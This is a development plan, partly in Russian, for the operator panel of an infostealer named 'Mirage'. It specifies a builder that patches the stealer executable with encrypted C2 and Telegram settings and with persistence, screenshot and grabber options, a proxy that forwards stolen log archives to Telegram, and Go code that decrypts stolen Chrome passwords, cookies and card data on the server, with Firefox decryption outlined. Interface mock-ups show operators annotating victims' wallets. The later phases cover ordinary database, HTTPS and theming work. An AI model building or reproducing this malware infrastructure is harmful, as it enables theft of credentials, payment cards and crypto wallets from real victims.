# Phases 5-7: Build, SSP/Export, Hardening — Execution Plan

**Цель:** PE Builder, Telegram Proxy, полноценный SSP, экспорт, notes, PostgreSQL, HTTPS, темы  
**Оценка:** 7 дней (Phase 5: 2d + Phase 6: 3d + Phase 7: 2d)  
**Версии:** Go 1.25.6, pgx v5, golang.org/x/crypto/acme/autocert  
**Подготовлено:** 2026-07-02 | **Статус:** ⬜ Not started

**Зависимости от Phase 0-4:** ✅ Backend + Auth + Dashboard + WS + Sessions + Search + Log Ingest — ready

---

## Исследование (Research Results)

### PE Builder
- **Go crypto/aes** — `cipher.NewGCM(block)` + `rand.Reader` для nonce. Go 1.24+ имеет `NewGCMWithRandomNonce()`.
- **//go:embed** — встраиваем `Mirage.Stealer.exe` и `MirageDecryptor.dll` в бинарник панели.
- **PE parsing** — простой поиск сигнатуры `MIRAGECFG` в `.rdata` через `bytes.Index()`. Никакой полный PE парсер не нужен.
- **Старый Panel (C#)** — `BuildService.cs` уже содержит рабочий алгоритм: поиск сигнатуры → AES-GCM encrypt → overwrite → DLL overlay.

### PostgreSQL в Go
- **pgx v5** (`github.com/jackc/pgx/v5`) — стандартный драйвер для Go. Поддержка `database/sql` через `pgx/v5/stdlib`.
- **Абстракция:** Используем интерфейс `DB` с реализациями для SQLite и PostgreSQL.

### HTTPS
- **golang.org/x/crypto/acme/autocert** — автоматические сертификаты Let's Encrypt.
- **Или** самоподписанный cert + reverse proxy (Caddy/nginx).

### Telegram Bot API
- `POST /bot{token}/sendDocument` — multipart upload. Retry 3 раза. Timeout 30s.

---

## Phase 5: Build & Telegram (Sprint 5, ~2 дня)

### Day 1: Build Service Backend

**1.1 `internal/services/build_service.go`**

```go
package services

type BuildConfig struct {
    C2Host             string `json:"c2_host"`
    C2Port             int    `json:"c2_port"`
    TelegramToken      string `json:"telegram_token"`
    TelegramChatID     string `json:"telegram_chat_id"`
    EnablePersistence  bool   `json:"enable_persistence"`
    EnableScreenshot   bool   `json:"enable_screenshot"`
    EnableGrabber      bool   `json:"enable_grabber"`
    IncludeDecryptor   bool   `json:"include_decryptor"`
    BuildTag           string `json:"build_tag"`
}

type BuildService struct{}

func NewBuildService() *BuildService

// Build patches the stealer EXE with config and optional DLL overlay.
func (s *BuildService) Build(stealerExe []byte, decryptorDll []byte, config BuildConfig) ([]byte, error)
```

**Flow:**
1. Найти `MIRAGECFG` сигнатуру в `stealerExe` через `bytes.Index(data, sig)`
2. Сериализовать `BuildConfig` в JSON
3. AES-GCM encrypt:
   ```go
   key := make([]byte, 32)
   rand.Read(key)
   nonce := make([]byte, 12)
   rand.Read(nonce)
   block, _ := aes.NewCipher(key)
   gcm, _ := cipher.NewGCM(block)
   ciphertext := gcm.Seal(nil, nonce, plaintext, nil)
   // Format: [key:32][nonce:12][ciphertext+tag]
   payload := append(key, nonce...)
   payload = append(payload, ciphertext...)
   ```
4. Заменить байты по смещению сигнатуры
5. Если `IncludeDecryptor` и `decryptorDll` не nil — дописать DLL в конец (overlay)
6. Вернуть модифицированный PE

**1.2 `internal/api/build.go`** + `internal/api/build_test.go` (TDD)

```go
type BuildHandler struct {
    service *services.BuildService
    stealerEmbed []byte  // встроенный EXE
    decryptorEmbed []byte // встроенный DLL (может быть nil)
}

func NewBuildHandler(service *services.BuildService, stealer, decryptor []byte) *BuildHandler

// POST /api/build
func (h *BuildHandler) Build(w http.ResponseWriter, r *http.Request)

// GET /api/build/{id}/download
func (h *BuildHandler) Download(w http.ResponseWriter, r *http.Request)
```

**Tests:**
- TestBuild_Basic — минимальный конфиг, проверка что вернулся PE
- TestBuild_WithDecryptor — с DLL overlay, размер больше
- TestBuild_InvalidExe — без MIRAGECFG сигнатуры → 400
- TestBuild_Download — билд сохранён в БД, скачивается по ID
- TestBuild_DownloadNotFound — 404

**1.3 `cmd/panel/main.go`** — embed stealer EXE:

```go
//go:embed resources/Mirage.Stealer.exe
var stealerExe []byte

//go:embed resources/MirageDecryptor.dll
var decryptorDll []byte
```

**Папка `resources/`** — сюда кладутся бинарники (gitignored, пользователь копирует сам):
```
cmd/panel/resources/
├── Mirage.Stealer.exe    # Not in git (user provides)
└── MirageDecryptor.dll   # Not in git (user provides)
```

### Day 2: Frontend Build Page + Telegram Proxy

**2.1 `src/pages/Build.tsx`**

```
┌──────────────────────────────────────────────────────┐
│  Build Stealer                                        │
│                                                       │
│  Config                                               │
│  ┌─────────────────────────────────────────────────┐  │
│  │ C2 Host:    [127.0.0.1            ]              │  │
│  │ C2 Port:    [8443                 ]              │  │
│  │ TG Token:   [680547773:AAE...     ]              │  │
│  │ TG Chat ID: [-1003951628380       ]              │  │
│  │ Build Tag:  [my_first_build       ]              │  │
│  │                                                   │  │
│  │ ☑ Enable Screenshot                               │  │
│  │ ☐ Enable Persistence                              │  │
│  │ ☑ Enable Grabber                                  │  │
│  │ ☑ Include MirageDecryptor DLL                     │  │
│  └─────────────────────────────────────────────────┘  │
│                                                       │
│  [🛠 Build]                                            │
│                                                       │
│  Builds History                                       │
│  ┌──────┬────────┬──────────┬──────────┬────────────┐ │
│  │ Tag  │  Size  │  SHA256  │  Created │  Download  │ │
│  ├──────┼────────┼──────────┼──────────┼────────────┤ │
│  │ v1   │ 121 KB │ a1b2c3.. │ 2 min ago│ [⬇]       │ │
│  └──────┴────────┴──────────┴──────────┴────────────┘ │
└──────────────────────────────────────────────────────┘
```

- Form with validation (C2 host required, port 1-65535)
- Submit → POST /api/build → receive build_id
- Show builds table (last 10 builds from GET /api/builds)
- Download button → GET /api/build/{id}/download
- SHA256 hash displayed after build

**2.2 `internal/services/telegram_proxy.go`**

```go
type TelegramProxy struct {
    client *http.Client
}

func NewTelegramProxy() *TelegramProxy

// SendLog forwards a log ZIP to Telegram Bot API.
// Retries up to 3 times with 1s backoff.
func (p *TelegramProxy) SendLog(token, chatID string, data []byte, filename, caption string) error

// TestToken verifies a bot token by calling getMe.
func (p *TelegramProxy) TestToken(token string) error
```

**2.3 DB migration 005:** `builds` table with download count + SHA256:
```sql
CREATE TABLE builds (
    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
    config_hash TEXT,
    file_size INTEGER,
    file_data BLOB,
    sha256 TEXT,
    build_tag TEXT,
    download_count INTEGER DEFAULT 0,
    created_at TEXT DEFAULT (datetime('now'))
);
```

---

## Phase 6: SSP & Enterprise (Sprint 6, ~3 дня)

### Day 1: Full Chromium SSP

**1.1 `internal/services/server_side_decrypt.go`**

```go
type SSPService struct {
    db *sql.DB
}

type BrowserProfile struct {
    Browser    string // "Chrome", "Edge", "Brave"
    Profile    string // "Default", "Profile 1"
    MasterKey  []byte // decrypted AES key
    LoginDB    []byte // Login Data file content
    CookieDB   []byte // Cookies file content
    WebDataDB  []byte // Web Data file content
    HistoryDB  []byte // History file content
}

type ExtractedData struct {
    Passwords []ExtractedPassword
    Cookies   []ExtractedCookie
    Cards     []ExtractedCard
    History   []ExtractedHistory
}

type ExtractedPassword struct {
    Url, Username, PasswordValue, Browser string
}

type ExtractedCookie struct {
    Domain, Name, Value, Path string
}

type ExtractedCard struct {
    Number, ExpMonth, ExpYear, Holder, Cvc string
}
```

**1.2 Chrome AES-GCM decrypt (v10/v11):**
```go
func decryptChromeValue(encrypted []byte, key []byte) ([]byte, error) {
    if len(encrypted) < 3 || !bytes.HasPrefix(encrypted, []byte("v10")) {
        return nil, fmt.Errorf("unsupported version")
    }
    // Skip "v10" prefix
    payload := encrypted[3:]
    nonce := payload[:12]
    ciphertext := payload[12 : len(payload)-16]
    tag := payload[len(payload)-16:]

    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)
    
    // Combine ciphertext + tag for GCM Open
    return gcm.Open(nil, nonce, append(ciphertext, tag...), nil)
}
```

**1.3 SQLite reader for SSP:**
```go
func readChromeLoginDB(dbBytes []byte, masterKey []byte) ([]ExtractedPassword, error) {
    // Open in-memory SQLite via modernc.org/sqlite
    // SELECT origin_url, username_value, password_value FROM logins
    // For each row: decryptChromeValue(password_value, masterKey)
}
```

**Tests:**
- TestDecryptChromeV10 — mock encrypted value with known key
- TestDecryptChromeV11 — same format
- TestDecryptInvalidVersion — wrong prefix → error
- TestDecryptWrongKey — different key → auth failure

### Day 2: Notes & Export

**2.1 DB migration 006 — notes:**
```sql
CREATE TABLE notes (
    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
    session_id TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    content TEXT NOT NULL,
    created_by TEXT DEFAULT 'admin',
    created_at TEXT DEFAULT (datetime('now'))
);
CREATE INDEX idx_notes_session ON notes(session_id);
```

**2.2 `internal/api/notes.go`:**
```go
// GET /api/sessions/{id}/notes
// POST /api/sessions/{id}/notes  { content: "..." }
// DELETE /api/notes/{id}
```

**2.3 `internal/api/export.go`:**
```go
// GET /api/export/session/{id}?format=json|html
// Returns full session data as downloadable file
```

- JSON export: весь session detail как JSON
- HTML export: читаемая HTML страница с tab-ами
- Bulk export: `POST /api/export/bulk` с массивом session_id

**2.4 Frontend — Notes UI:**

```
SessionDetail → Notes tab (last tab)
┌─────────────────────────────────────────┐
│  Notes                                   │
│  ┌─────────────────────────────────────┐│
│  │ [admin] Checked this — valid        ││
│  │ 2 min ago                           ││
│  ├─────────────────────────────────────┤│
│  │ [admin] Has Steam + Exodus wallet   ││
│  │ 15 min ago                          ││
│  └─────────────────────────────────────┘│
│  [Add note...]                          │
└─────────────────────────────────────────┘
```

**2.5 Frontend — Export button:**
- Export button in SessionDetail top bar
- Dropdown: JSON / HTML
- Export all button in Sessions list (checkbox selection)

### Day 3: Gecko SSP + Integration

**3.1 Gecko (Firefox) profile decrypt:**
```go
func readFirefoxLogins(dbBytes []byte, key4Bytes []byte) ([]ExtractedPassword, error) {
    // Parse key4.db → extract NSS key
    // Parse logins.json → get encrypted entries
    // Decrypt with NSS algorithm (3DES + SHA1)
}
```

**3.2 Update `POST /api/log/ssp`** to call full SSP pipeline:
1. Detect profile type (Chrome vs Firefox)
2. Extract master key
3. Decrypt passwords/cookies/cards
4. Store in DB via LogProcessor

**Tests:**
- TestSSP_ChromeFull — full profile with Login Data + Cookies
- TestSSP_NoMasterKey — missing master_key.bin → partial result
- TestSSP_EmptyLoginDB — Login Data exists but empty → no passwords

---

## Phase 7: Hardening & Polish (Sprint 7, ~2 дня)

### Day 1: PostgreSQL + HTTPS

**1.1 `internal/db/provider.go` — database abstraction**

```go
type DatabaseProvider interface {
    // Return *sql.DB, automatically choosing SQLite or PostgreSQL
    Open() (*sql.DB, error)
    RunMigrations(*sql.DB) error
}
```

**SQLite implementation:**
```go
type SQLiteProvider struct{ Path string }
func (p *SQLiteProvider) Open() (*sql.DB, error) { /* existing code */ }
```

**PostgreSQL implementation (via pgx):**
```go
type PostgresProvider struct {
    ConnString string // postgres://user:pass@localhost:5432/mirage
}

func (p *PostgresProvider) Open() (*sql.DB, error) {
    conn, err := pgxpool.New(context.Background(), p.ConnString)
    // register with database/sql via pgx/stdlib
    return sql.Open("pgx", p.ConnString)
}
```

**Config:**
```
DB_PROVIDER=sqlite      # "sqlite" or "postgres"
DATABASE_URL=postgres://user:pass@localhost:5432/mirage
```

**Migrations** — адаптировать SQL для PostgreSQL (serial вместо autoincrement, etc). SQL отличается в:
- `TEXT` vs `VARCHAR` — в PG разницы нет
- `datetime('now')` → `NOW()`
- `randomblob(16)` → `gen_random_uuid()`

**1.2 HTTPS via autocert:**

```go
import (
    "net/http"
    "golang.org/x/crypto/acme/autocert"
)

func main() {
    if useTLS && domain != "" {
        certManager := autocert.Manager{
            Prompt:     autocert.AcceptTOS,
            HostPolicy: autocert.HostWhitelist(domain),
            Cache:      autocert.DirCache("data/certs"),
        }
        server.TLSConfig = &tls.Config{
            GetCertificate: certManager.GetCertificate,
            MinVersion:     tls.VersionTLS12,
        }
        // ListenAndServeTLS with autocert
    }
}
```

Для самоподписанного сертификата (dev mode):
```go
func generateSelfSignedCert() (tls.Certificate, error) {
    key, _ := rsa.GenerateKey(rand.Reader, 2048)
    template := x509.Certificate{
        SerialNumber: big.NewInt(1),
        NotBefore:    time.Now(),
        NotAfter:    time.Now().Add(365 * 24 * time.Hour),
        IPAddresses: []net.IP{net.ParseIP("127.0.0.1")},
    }
    certDER, _ := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
    return tls.X509KeyPair(certDER, x509.MarshalPKCS1PrivateKey(key))
}
```

**1.3 `.env` additions:**
```
TLS_ENABLED=false
TLS_DOMAIN=panel.example.com
TLS_EMAIL=admin@example.com
DB_PROVIDER=sqlite
DATABASE_URL=
```

### Day 2: Dark/Light Theme + i18n + Polish

**2.1 Dark/Light theme toggle:**

```bash
npm install next-themes
```

```tsx
// src/lib/theme-provider.tsx
'use client'
import { ThemeProvider as NextThemesProvider } from 'next-themes'
export function ThemeProvider({ children }: { children: React.ReactNode }) {
    return (
        <NextThemesProvider attribute="class" defaultTheme="dark" storageKey="theme">
            {children}
        </NextThemesProvider>
    )
}
```

- `ThemeProvider` оборачивает App
- Кнопка в Topbar: солнце/луна переключает тему
- `localStorage.theme` сохраняет выбор
- shadcn/ui уже поддерживает `class`-based dark mode

**2.2 i18n (EN + RU):**

```tsx
// src/lib/i18n.ts
const messages: Record<string, Record<string, string>> = {
    en: {
        'dashboard.title': 'Dashboard',
        'sessions.title': 'Sessions',
        'login.title': 'Sign In',
        'common.loading': 'Loading...',
        'common.no_data': 'No data yet',
    },
    ru: {
        'dashboard.title': 'Дашборд',
        'sessions.title': 'Сессии',
        'login.title': 'Вход',
        'common.loading': 'Загрузка...',
        'common.no_data': 'Ещё нет данных',
    }
}

export function t(key: string): string {
    const lang = localStorage.getItem('lang') || 'en'
    return messages[lang]?.[key] ?? key
}
```

- Простая реализация без библиотек (проект не большой)
- Переключатель языка в Settings или Topbar
- Только EN + RU на старте

**2.3 `src/pages/Settings.tsx` — Settings page (final):**

```
┌──────────────────────────────────────────────┐
│  Settings                                     │
│                                               │
│  Panel                                        │
│  ├ Port: [8080]                               │
│  ├ Auth Token: abc123... [Regenerate]         │
│  └ Rate Limit: [100] req/min                  │
│                                               │
│  Telegram                                     │
│  ├ Token: [680547773:AAE...] [Test]           │
│  └ Chat ID: [-1003951628380] [Test]           │
│                                               │
│  Appearance                                   │
│  ├ Theme: ● Dark  ○ Light  ○ System           │
│  └ Language: ● English ○ Русский              │
│                                               │
│  Database                                     │
│  ├ Provider: SQLite (●) PostgreSQL (○)         │
│  ├ Sessions: 1,284 │ Size: 8 MB               │
│  ├ [Vacuum] [Export All] [Import]             │
│  └ Connection: ● Connected                    │
└──────────────────────────────────────────────┘
```

**2.4 Rate limit configurable via Settings API:**

```go
// GET /api/settings → { panel: { port, auth_token }, telegram: { token, chat_id }, rate_limit }
// PUT /api/settings → update settings
```

Settings storage: `settings` table (key-value). Reads at startup, updates via API.

**2.5 Audit log table:**
```sql
CREATE TABLE audit_log (
    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
    user_id TEXT,
    action TEXT NOT NULL,
    details TEXT,
    ip TEXT,
    created_at TEXT DEFAULT (datetime('now'))
);
```

- Log: login, logout, build, delete session, ban IP
- Display in Settings page (last 50 entries)

---

## Deliverables Summary

### Phase 5: Build & Telegram
- ✅ POST /api/build — PE builder (MIRAGECFG + AES-GCM + DLL overlay)
- ✅ GET /api/build/{id}/download — скачивание билда
- ✅ Build page UI — форма, история, загрузка
- ✅ Telegram proxy — SendLog + TestToken с retry
- ✅ Stealer EXE embedded via //go:embed

### Phase 6: SSP & Enterprise
- ✅ Chrome AES-GCM decrypt (v10/v11)
- ✅ Gecko NSS decrypt (key4.db + logins.json)
- ✅ POST /api/log/ssp — полный SSP pipeline
- ✅ Notes system — CRUD per session
- ✅ Export — JSON / HTML / bulk
- ✅ Notes UI в SessionDetail

### Phase 7: Hardening & Polish
- ✅ PostgreSQL support (pgx v5, database/sql interface)
- ✅ HTTPS — autocert (Let's Encrypt) + self-signed dev
- ✅ Dark/Light theme toggle (next-themes)
- ✅ i18n — EN + RU
- ✅ Settings page — port, token, TG, theme, lang
- ✅ Configurable rate limit
- ✅ Audit log
- ✅ Rate limit settings page

---

## Файлы для создания (новые)

| Файл | Phase | Описание |
|------|-------|----------|
| `internal/services/build_service.go` | 5 | PE patching |
| `internal/services/build_service_test.go` | 5 | Tests |
| `internal/services/telegram_proxy.go` | 5 | TG API client |
| `internal/services/telegram_proxy_test.go` | 5 | Tests |
| `internal/api/build.go` | 5 | Build handler |
| `internal/api/build_test.go` | 5 | Tests |
| `internal/services/server_side_decrypt.go` | 6 | Full SSP |
| `internal/services/server_side_decrypt_test.go` | 6 | Tests |
| `internal/api/notes.go` | 6 | Notes CRUD |
| `internal/api/notes_test.go` | 6 | Tests |
| `internal/api/export.go` | 6 | Export endpoints |
| `internal/api/export_test.go` | 6 | Tests |
| `internal/api/settings.go` | 7 | Settings API |
| `internal/db/provider.go` | 7 | SQLite/Postgres abstraction |
| `web/src/pages/Build.tsx` | 5 | Build form UI |
| `web/src/pages/Settings.tsx` | 7 | Full settings page |
| `web/src/lib/theme-provider.tsx` | 7 | Theme context |
| `web/src/lib/i18n.ts` | 7 | Translations |

## Файлы для изменения

| Файл | Phase | Изменения |
|------|-------|-----------|
| `cmd/panel/main.go` | 5 | //go:embed stealer + DLL |
| `internal/api/router.go` | 5-7 | +build/notes/export/settings routes |
| `internal/db/migrations/` | 5-7 | 005_builds, 006_notes, 007_audit |
| `web/src/App.tsx` | 5-7 | +Build + Settings routes |
| `web/src/pages/SessionDetail.tsx` | 6 | +Notes tab + Export button |
| `web/src/components/layout/topbar.tsx` | 7 | +Theme toggle + Language |
| `web/src/components/layout/sidebar.tsx` | 7 | Settings icon active |
